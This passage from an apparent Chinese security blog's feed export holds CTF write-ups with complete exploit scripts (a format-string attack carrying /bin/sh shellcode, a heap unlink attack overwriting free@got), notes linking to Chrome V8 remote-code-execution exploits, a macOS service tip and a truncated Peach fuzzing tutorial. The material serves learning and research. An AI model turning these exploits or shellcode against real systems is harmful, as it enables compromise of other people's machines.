<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>linux kernel</tag>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>crbug1051017 exploit</title>
    <url>/2020/06/05/crbug1051017-exploit/</url>
    <content><![CDATA[<h2 id="about"><a href="#about" class="headerlink" title="about"></a>about</h2><p>最近看到<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a>公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。</p>
<a id="more"></a>

<h2 id="how2exploit"><a href="#how2exploit" class="headerlink" title="how2exploit"></a>how2exploit</h2><p>因为<code>glazunov</code>的poc已经做到了oob array阶段了，所以通过布局一个BigUint64Array来任意地址读写即可，即利用方式参考<code>CVE-2020-6418</code>就可以了。</p>
<h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h2><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M80_crbug1051017">exploit</a></p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a><br><a href="https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">browser-pwn-cve-2020-6418漏洞分析</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit for crbug1086890</title>
    <url>/2020/08/27/exploit-for-crbug1086890/</url>
    <content><![CDATA[<h2 id="bug-info"><a href="#bug-info" class="headerlink" title="bug info"></a>bug info</h2><p>来自pj0的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046">glazunov</a>的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。</p>
<span id="more"></span>

<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>比较不好的地方就是需要大概猜一下那个oobarray的elements的地址，使得我们想用来aar/w的array或者arraybuffer落在这后面，大概调整个偏移使得能够正常读写到就行。</p>
<p>测试版本:83.0.4103.61 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048be</span><br><span class="line">Branch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514</span><br><span class="line">Branch Base Position: 756066</span><br><span class="line">V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480af</span><br><span class="line">V8 Version: 8.3.110.9</span><br><span class="line">V8 Position: 19</span><br><span class="line">Skia Commit: c3d05a789930913af94174961bc6f90894196f62</span><br></pre></td></tr></table></figure>



<ul>
<li>调试会比较麻烦点，gdb 直接起触发有问题（我这里是），我是开了coredump，然后触发crash看看内存啥的调的。</li>
<li>biguint64 还是 arraybuffer都行，喜欢啥用啥。</li>
<li>想成功率高，要用web worker（我觉得），要么死猜几个地址，要么随机撞大运。</li>
</ul>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/crbug1086890/CleanShot%202020-08-27%20at%2011.26.03.png" alt="exploit linux d8"></p>
<p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M83_crbug1086890_RCE">完整利用代码</a></p>
<hr>
<p>觉得有用的朋友可以打赏一杯☕️ :)</p>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>find macOS service and it&#39;s plist file</title>
    <url>/2019/06/14/find-macOS-service-and-it-s-plist-file/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h2><p>find macOS service ‘s plist file.</p>
<p><code>com.apple.xxxx</code> —&gt; <code>xxxx.plist</code></p>
<a id="more"></a>



<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01 :"></a>0x01 :</h2><p>find all <code>*.plist</code> file and use <code>grep</code> to find target service, not the best way.</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02 :"></a>0x02 :</h2><p>use <code>procexp</code>.  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./procexp.universal all ports | service_name</span><br></pre></td></tr></table></figure>



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03 :"></a>0x03 :</h2><p>this way is more complex than others, thx to <a href="https://brightiup.me/">brightiup</a> :)</p>
<ol>
<li><p>step 1</p>
<p>write a simple gadget, core logic as follow:</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bootstrap_look_up(bs_port, render_service_name, &amp;p);</span><br><span class="line">...</span><br><span class="line">mach_msg(&amp;m.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">getchar(); <span class="comment">//do not exit untill we finish</span></span><br></pre></td></tr></table></figure>



<ol start="2">
<li><p>step 2</p>
<p>get the pid of your gadget</p>
</li>
</ol>
<ol start="3">
<li><p>Step 3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo lsmp -p pid</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>now, you can get the service name according to mach port, then find the plist file by service name you found.</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>format string with stack frame</title>
    <url>/2015/12/02/format-string-with-stack-frame/</url>
    <content><![CDATA[<h4 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00:写在前面"></a>0x00:写在前面</h4><p>格式化字符串漏洞出现的时间很早了，偶然在前一段时间学到了一个其他的利用姿势，通过栈桢结构去利用格式化字符串漏洞。<br><a href="http://phrack.org/issues/59/7.html">原文链接</a></p>
<a id="more"></a>

<h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01:原理"></a>0x01:原理</h4><p>在函数调用的时候，会开辟一段空间去给当前函数使用，做法是通过抬高栈来实现(sub esp,0x**)，为了执行函数后能正确的返回，栈基指针ebp是指向上一个函数的ebp的，也就是被调用函数ebp指向调用函数ebp。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fsb/ebp.png"><br>大概的样子就如图了，简单的写一个demo就可以发现这个。<br>　　对于格式化字符串来说，本质还是任意地址的读写，可以用来修改<code>got、ret_addr</code>去控制程序流程，还可以 多次利用格式串，把<code>shellcode</code>一个字节一个字节写到一个<code>w+x</code>的内存地址去，然后修改got跳过去执行。</p>
<p>但是如果格式化字符串不在栈中呢？如果不在栈中，那么就不能通过 %*$ 这样的方式去定位，增大了利用难度，在看了phrack的文章，了解到了一种姿势：假如要把 <code>sleep@got</code>修改成 <code>system@got</code>，可以先利用格</p>
<p>式串把sleep@got先写到当前ebp指向，然后再次利用，把这个改掉，因为都是在 got表中，所以只需要改最后两个字节(x86)。 这样的话就实现了 不在栈中格式串的利用了。</p>
<h4 id="0x02：实例"><a href="#0x02：实例" class="headerlink" title="0x02：实例"></a>0x02：实例</h4><p>拿plaidctf-2015的一个pwn来演示。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fsb/file.png"></p>
<p>bin文件的基本信息如图，分别运行和在ida中分析。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fsb/exec.png"><br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fsb/ida.png"><br>明显的FSB在 <code>make_response </code>函数中。<br>　　但是，用户的输入是在 <code>0804A040 </code>这个地址，这个地址是在<code>.bss</code>段的(栈中看不到，但是好处是不随机) 思路大概就是，把<code>shellcode</code>放在这个地方，然后修改 <code>make_response</code> 的<code>ret addr</code> 到这个地址去，然后就可以拿到shell了。</p>
<p>　　1. leak 栈地址 找到ret addr<br>　　2. 写到上一个ebp去<br>　　3. 修改ret addr 到 0804A040</p>
<h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03:exp"></a>0x03:exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#--by muhe--</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target='./ebp'</span></span><br><span class="line">target = (<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line">io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, <span class="string">'red'</span>), print_write=COLORED(RAW, <span class="string">'green'</span>))</span><br><span class="line">shellcode = (<span class="string">"\x6a\x0b\x58\x99\x52\x68\x2f\x2f"</span></span><br><span class="line">             <span class="string">"\x73\x68\x68\x2f\x62\x69\x6e\x54"</span></span><br><span class="line">             <span class="string">"\x5b\x52\x53\x54\x59\x0f\x34"</span>)</span><br><span class="line">vuln_addr  =<span class="number">0x0804a480</span></span><br><span class="line"><span class="comment">#leak stack addr</span></span><br><span class="line">io.writeline(<span class="string">'%4$p'</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">leak_addr = int(io.read_until(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = (leak_addr<span class="number">-0x1c</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="keyword">print</span> ret_addr</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">p1 = <span class="string">"%"</span>+str(ret_addr)+<span class="string">"x%"</span>+str(<span class="number">4</span>)+<span class="string">"$hn"</span></span><br><span class="line">io.writeline(p1)</span><br><span class="line">io.read_until(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line"><span class="comment">##raw_input()</span></span><br><span class="line">p2 = shellcode+<span class="string">"%"</span>+str((vuln_addr &amp; <span class="number">0xffff</span>)-len(shellcode))+<span class="string">"x%"</span>+str(<span class="number">12</span>)+<span class="string">"$hn"</span></span><br><span class="line">io.writeline(p2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fsb/get%20shell.png"></p>
<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04:参考"></a>0x04:参考</h4><ol>
<li>   <a href="http://phrack.org/issues/59/7.html">phrack</a></li>
<li>   <a href="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">geeksspeak</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>heap vuln -- unlink</title>
    <url>/2016/02/15/heap-vuln-unlink/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00:起因"></a>0x00:起因</h4><p>一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。</p>
<a id="more"></a>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>关于heap的unlink的漏洞利用，出的很早，在低版本的libc中，因为没有校验，导致在unlink的时候可以通过构造堆块dwordshoot，从而任意代码执行。<br>对于这种漏洞的学习，首先要了解malloc的工作原理及几种堆块的分配、使用方式。推荐文章 <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc</a></p>
<h4 id="0x02-文件信息"><a href="#0x02-文件信息" class="headerlink" title="0x02:文件信息"></a>0x02:文件信息</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/heap_unlink/o_info.png"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/heap_unlink/t_sec_check.png"></p>
<h4 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03:分析"></a>0x03:分析</h4><p>程序是一个菜单式的程序，可以用户自定义分配块的长度和内容，漏洞在于：edit的时候，没做长度校验导致可以溢出，通过构造可以bypass 在libc中unlink的校验，从而getshell。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/heap_unlink/o_vuln.png"></p>
<h4 id="0x04-在drops看到的姿势"><a href="#0x04-在drops看到的姿势" class="headerlink" title="0x04:在drops看到的姿势"></a>0x04:在drops看到的姿势</h4><p><a href="http://drops.wooyun.org/tips/7326">堆溢出的unlink利用方法</a><br>按照文中给出的方式，为了bypass</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">4malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</span><br></pre></td></tr></table></figure>
<p>这么一个指针的校验，我们找到一个特殊的 指针ptr是指向p的(p指向堆)<br>那么可以根据p去构造bk和fd两个指针</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk0                malloc返回的ptr           chunk1        malloc返回的ptr</span><br><span class="line">|                     |                        |             |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |</span><br><span class="line">|           |         |prev|size| FD | BK | A  | prev | size&amp;|    |    |      |</span><br><span class="line">| prev_size |size&amp;Flag|size|    |    |    | T  | size | flag |    |    |      |</span><br><span class="line">|           |         |    |    |    |    | A  |      |      |    |    |      |</span><br><span class="line">|           |         |    |    |    |    |    |      |      |    |    |      |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">                      |--------new_size--------|</span><br><span class="line">                      list</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l32(<span class="number">0</span>)  +  l32(<span class="number">0x89</span>)  +  l32(list<span class="number">-0xc</span>) + l32(list<span class="number">-0x8</span>) +<span class="string">"A"</span>*(<span class="number">128</span><span class="number">-4</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA</span></span><br><span class="line"><span class="comment">#   4bytes        4bytes     4bytes    4bytes    128-4*4</span></span><br><span class="line"><span class="comment">#pre_size   +   size&amp;flag</span></span><br><span class="line">l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</span><br><span class="line">free(chunk_1)</span><br></pre></td></tr></table></figure>
<p>分配两个长度合适的块，伪造第一个块，然后通过修改了第二个块的pre_size 和size<br>然后free(chunk1) 触发unlink</p>
<p>之后再次修改指针p 从而达到leak地址，修改地址的目的</p>
<h4 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05:exp"></a>0x05:exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line">chunk_list = <span class="number">0x8049d60</span></span><br><span class="line">free_got = <span class="number">0x8049ce8</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    data = <span class="string">"A"</span> * <span class="number">0xc</span> + p32(chunk_list<span class="number">-0xc</span>) + p32(addr)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        set_chunk(<span class="number">0</span>, data)</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        set_chunk2(<span class="number">0</span>, data)</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    res = print_chunk(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"leaking: %#x ---&gt; %s"</span> % (addr, res[<span class="number">0</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> res[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_chunk</span><span class="params">(len)</span>:</span></span><br><span class="line">4<span class="keyword">print</span> p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">4p.sendline(<span class="string">'1'</span>)</span><br><span class="line">4<span class="keyword">print</span> p.recvuntil(<span class="string">'Input the size of chunk you want to add:'</span>)</span><br><span class="line">4p.sendline(str(len))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk</span><span class="params">(index,data)</span>:</span></span><br><span class="line">4p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">4p.sendline(<span class="string">'2'</span>)</span><br><span class="line">4p.recvuntil(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">4p.sendline(str(index))</span><br><span class="line">4p.recvuntil(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">4p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk2</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">4p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">4p.sendline(<span class="string">'3'</span>)</span><br><span class="line">4p.recvuntil(<span class="string">'Delete chunk index:'</span>)</span><br><span class="line">4p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">4p.sendline(<span class="string">'4'</span>)</span><br><span class="line">4p.recvuntil(<span class="string">'Print chunk index:'</span>)</span><br><span class="line">4p.sendline(str(index))</span><br><span class="line">4res = p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">4<span class="keyword">return</span> res</span><br><span class="line">raw_input(<span class="string">'add_chunk'</span>)</span><br><span class="line">add_chunk(<span class="number">128</span>)  <span class="comment">#0</span></span><br><span class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#1</span></span><br><span class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#2</span></span><br><span class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#3</span></span><br><span class="line">set_chunk(<span class="number">3</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x89</span>) + p32(chunk_list<span class="number">-0xc</span>) + p32(chunk_list<span class="number">-0x8</span>)</span><br><span class="line">payload += <span class="string">"A"</span>*(<span class="number">0x80</span><span class="number">-4</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#2nd chunk </span></span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">set_chunk(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#get the pointer</span></span><br><span class="line">del_chunk(<span class="number">1</span>)</span><br><span class="line">set_chunk(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">12</span> + p32(<span class="number">0x8049d54</span>) + p32(<span class="number">0x8049d14</span>))</span><br><span class="line">raw_input(<span class="string">'leak'</span>)</span><br><span class="line"><span class="comment">#leak system_addr</span></span><br><span class="line">pwn_elf = ELF(<span class="string">'./heap'</span>)</span><br><span class="line">d = DynELF(leak, elf=pwn_elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">print(<span class="string">"system addr: %#x"</span> % sys_addr)</span><br><span class="line">raw_input(<span class="string">'edit free@got'</span>)</span><br><span class="line">data = <span class="string">"A"</span> * <span class="number">12</span> + p32(chunk_list<span class="number">-0xc</span>) + p32(free_got)</span><br><span class="line">set_chunk2(<span class="string">'0'</span>, data)</span><br><span class="line">set_chunk2(<span class="string">'1'</span>, p32(sys_addr))</span><br><span class="line">del_chunk(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/heap_unlink/o_getshell.png"></p>
<h4 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06:参考"></a>0x06:参考</h4><ol>
<li>   <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc</a></li>
<li>   <a href="http://drops.wooyun.org/tips/7326">堆溢出的unlink利用方法</a></li>
</ol>
<ul>
<li>   最后还要感谢chxx大表哥的pwn和指导=。=</li>
<li>   所有文件都在这里了 <a href="https://github.com/o0xmuhe/heap_pwn_study">文件下载</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>fuzzing with peach(Just a toy)</title>
    <url>/2016/12/17/fuzzing-with-peach-Just-a-toy/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>之前学习过peach的使用，在willj师傅的指导下尝试去fuzz了某播放器，只是个尝试，并没有更深入去搞(本来的计划是结合winafl的)，虽然没啥产出，但是fuzz过程还算清晰。过程中实现了自动化的fuzz脚本，有完整的功能，就是效率堪忧-。-</p>
<a id="more"></a>

<h5 id="0x01-关于peach"><a href="#0x01-关于peach" class="headerlink" title="0x01: 关于peach"></a>0x01: 关于peach</h5><p><a href="http://www.peachfuzzer.com/resources/peachcommunity/">peach</a>是一款优秀的文件格式fuzz工具。<br>peach是基于模板变异工作的，而且开源，文档虽然不是那么多，但是自己多摸索、学习还是可以学会一些基本的用法的。我在看使用peach做文件fuzz相关的资料的时候，最开始看的《0day2》里作者给的例子，从编写pit file到fuzz跑起来；之后看了一份国际友人写的<a href="http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/">Fuzzing with Peach – Part 1 « Flinkd!</a>，他这篇文章写的非常好，几乎涵盖了peach 90%的语法，仔细阅读，自己动手实践，会很快入门pit file的编写。</p>
<h5 id="0x02-文件fuzz的思路"><a href="#0x02-文件fuzz的思路" class="headerlink" title="0x02: 文件fuzz的思路"></a>0x02: 文件fuzz的思路</h5><p>fuzz嘛，简单的来看就是</p>
<ul>
<li>   构造输入</li>
<li>   传给目标程序</li>
<li>   程序状态检测(是否crash)</li>
<li>   做log</li>
</ul>
<p>之后根据你的log，把有用的样本拿出来在分析。<br>我的想法也很简单，就是利用peach基于我给的一个小文件，生成很多样本，然后写自动化的脚本去fuzz，并且做好异常检测的工作。<br>我的目标是adobe flash player sa版本，刚开始尝试就做一点简单的，选择flv文件作为fuzz的点。下面的问题就是：</p>
<ol>
<li>   flv文件格式</li>
<li>   根据文件格式编写pit file</li>
<li>   如何加载我的fuzz.flv文件？</li>
<li>   异常检测怎么做</li>
</ol>
<p>下面慢慢来分析。</p>
<ol>
<li><p>flv文件格式<br><code>flv</code>文件主要分为<code>header</code>和<code>body</code>两个部分。</p>
<ol>
<li>header部分<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第1-3字节：文件标志，FLV的文件标志为固定的“FLV&quot;，字节（0x46， 0x4C，0x56），见上面的字节序和字符序两行；</span><br><span class="line">第4字节：当前文件版本，固定为1（0x01）</span><br><span class="line">第5字节：此字节当前用到的只有第6，8两个bit位，分别标志当前文件是否存在音频，视频。参见上面bit序，即是第5字节的内容；</span><br><span class="line">第6-9字节：此4字节共同组成一个无符号32位整数（使用大头序），表示文件从FLV Header开始到Flv Body的字节数，当前版本固定为9（0x00，0x00，0x00，0x09）</span><br></pre></td></tr></table></figure></li>
<li>body部分<br>这部分其实就是很多的tag的组合。<br>不过tag的种类有三种，分别是script、Audio、Video。每种tag的tag data又各不相同，详细的可以看一些文档了解。  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------------------------</span><br><span class="line">|  Previous Tag Size    |</span><br><span class="line">-------------------------</span><br><span class="line">|          Tag          |</span><br><span class="line">-------------------------</span><br><span class="line">|  Previous Tag Size    |</span><br><span class="line">-------------------------</span><br><span class="line">|          Tag          |</span><br><span class="line">-------------------------</span><br><span class="line">|  Previous Tag Size    |</span><br><span class="line">-------------------------</span><br><span class="line">|          Tag          |</span><br><span class="line">-------------------------</span><br><span class="line">|  Previous Tag Size    |</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure>
  一些参考的文档<a href="http://blog.useasp.net/archive/2016/02/28/The-flv-video-file-format-specification-version-10-1.aspx">flv文件格式详解</a>，以及是官方的flv格式相关的文档都可以。</li>
</ol>
</li>
<li><p>   根据文件格式编写pit file<br>了解了文件格式之后就是编写pit file了，困难的地方可能就在于tag结构，因为数目不确定，而且相互之间有联系，比如某个bit为1或者0，影响着后面的某个结构的有无。<br>我的做法是，我使用类似Switch case这样的结构，让peach自己去判断选择对应的结构，即我写三种tag，然后限定最大的出现次数，因为样本很小，几百个最多了，然后peach根据模板文件的tag的标志，找到我pit file里对应的tag的结构，然后根据pit file里的结构进行变异，然后生成新的样本。<br>这里可以集合010 editor的二进制模板功能，可以对比你生成的样本是否正确，方便调试。</p>
</li>
<li><p>   如何加载我的fuzz.flv文件？<br>有了样本，下面的问题就是怎么加载样本然后播放了。flash并不直接打开flv文件，而是使用swf来加载，所以我需要用as语言来编写一个swf来加载。这时候就有又一个问题：swf要编译的，即我的文件名会写死，这时候就麻烦了。<br>不过这个也好解决，我可以在后续的fuzz脚本中，每次单独复制一个样本到工作目录，然后重命名为swf要加载的文件的名字，然后起flash，加载swf，然后做后续的工作；完成之后，循环这个工作。这样就可以很好的解决这个问题了。</p>
</li>
<li><p>   异常检测怎么做<br>我觉得最简单的办法就是调试器了，如果你进程崩了，你的just in time debugger会启动，问你要不要调试，你检测进程就可以了，然后做log，杀了所有进程，继续下一轮fuzz就好了。缺点很明显，这方法贼搓，而且效率低的要死，刚开始搞嘛，凑合用咯。</p>
</li>
</ol>
<h5 id="0x03-编写pit-file"><a href="#0x03-编写pit-file" class="headerlink" title="0x03: 编写pit file"></a>0x03: 编写pit file</h5><p>首先是针对flv header的部分的编写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;flvHeader&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">String</span> <span class="attr">name</span>=<span class="string">&quot;flv_Signature&quot;</span> <span class="attr">value</span>=<span class="string">&quot;464C5601&quot;</span> <span class="attr">valueType</span>=<span class="string">&quot;hex&quot;</span> <span class="attr">token</span>=<span class="string">&quot;true&quot;</span> <span class="attr">mutable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">Flags</span> <span class="attr">name</span>=<span class="string">&quot;HeadFlags&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;dummy&quot;</span>  <span class="attr">position</span>=<span class="string">&quot;3&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;audio&quot;</span>  <span class="attr">position</span>=<span class="string">&quot;2&quot;</span> <span class="attr">size</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;dummy2&quot;</span> <span class="attr">position</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Flag</span> <span class="attr">name</span>=<span class="string">&quot;video&quot;</span>  <span class="attr">position</span>=<span class="string">&quot;0&quot;</span> <span class="attr">size</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Flags</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;dataoffset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;9&quot;</span> <span class="attr">size</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Number</span> <span class="attr">name</span>=<span class="string">&quot;zero&quot;</span> <span class="attr">size</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这部分是script tag部分的编写</p>
